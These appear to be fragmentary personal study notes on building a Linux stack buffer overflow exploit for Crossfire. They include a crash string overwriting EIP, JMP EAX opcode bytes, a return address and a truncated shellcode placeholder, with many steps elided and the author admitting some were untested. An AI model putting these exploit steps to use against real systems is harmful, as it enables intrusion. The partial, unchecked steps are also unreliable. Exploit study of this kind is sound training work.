---
title: Linux Buffer Overflow (Crossfire)
...
## Run debugger and crash the app
...
Replace: 
```py
crash = "\x41" * 4368 + "B" * 4 + "C" * 7": python EIP_BBBB.py
```

## Make space for the shellcode  
...
```
Add instructions together (JMP EAX + 12 bytes) = \x83\xc0\x0c\xff\xe0 to python. 
Looks like I didn’t test again here? Just note nasm output and move on?
...
## Redirect execution flow - Find a return address
...
## Make shellcode excluding bad characters
bind or reverse? why?
```bash
...
## Add shellcode into python script
```py
shellcode = ("\xd9\... \x30")
ret="\x97\x45\x13\x08"
